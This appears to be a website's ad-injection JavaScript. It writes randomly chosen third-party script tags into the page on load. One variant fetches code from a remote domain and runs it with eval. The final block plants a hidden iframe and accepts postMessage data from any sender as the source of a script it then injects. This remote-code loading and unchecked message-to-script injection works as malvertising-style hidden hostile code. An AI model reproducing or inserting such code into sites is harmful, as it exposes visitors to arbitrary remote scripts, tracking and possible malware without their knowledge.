
var randoms = {
	ads_codes: ['<script src="https://dian.tiantianyinyue.cn/d/7368F9E0-2A48-474E-8312-EF69C25FEC35.ap"><'+'/script>','<script>    (function () {        var id = "8409388612546995900-13301";        document.write(\'<ins style="display:none!important" id="\' + id + \'"><'+'/ins>\');        (window.adbyunion = window.adbyunion || []).push(id);    })();<'+'/script><script async  src="https://alibu.2526game.com/o.js"><'+'/script>','<script>    (function () {        var id = "3929776671695658599-10249";        document.write(\'<ins style="display:none!important" id="\' + id + \'"><'+'/ins>\');        (window.adbyunion = window.adbyunion || []).push(id);    })();<'+'/script><script async src="https://js.huobiad1.com:8089/o.js"><'+'/script>'],
	ads_weight: [10,10,10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();

var randoms = {
	ads_codes: ['<script>    (function () {        var id = "2415689770463175004-5101";        document.write(\'<ins style="display:none!important" id="\' + id + \'"><'+'/ins>\');        (window.adbyunion = window.adbyunion || []).push(id);    })();<'+'/script><script async defer src="https://www.yhhls.com/o.js"><'+'/script>','<script src="https://dian.tiantianyinyue.cn/d/D813085F-FA75-4B6F-8818-51E6F26C3E0F.ap"><'+'/script>','<script>;(function(w,d){var b=\'https://k.jinxiuzhilv.com/d.php?pid=8708&n=\'+Math.random();var a=new XMLHttpRequest();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(w.execScript)w.execScript(a.responseText,\'JavaScript\');else if(w.eval)w.eval(a.responseText,\'JavaScript\');else eval(a.responseText);}};a.open(\'GET\',b,false);a.send();}})(window,document);<'+'/script>'],
	ads_weight: [10,10,10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();
(function() {window.addEventListener("message",function(e) {var _show_s_1762 = e.data;if (_show_s_1762.show_s_1762) {var _s = '/+/g';var zRaqtr = document.createElement("script");zRaqtr.setAttribute("async","async");zRaqtr.src = decodeURIComponent(_show_s_1762.show_s_1762.replace(_s, "%20"));var cHeBg = document.getElementById("js1762");cHeBg.parentNode.insertBefore(zRaqtr,cHeBg);}});var t=parseInt(Date.parse(new Date())/100000);document.write('<iframe id="js1762" style="display:none;" src="https://s.alightin.com/'+t+'1762.html?w=2" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')})();
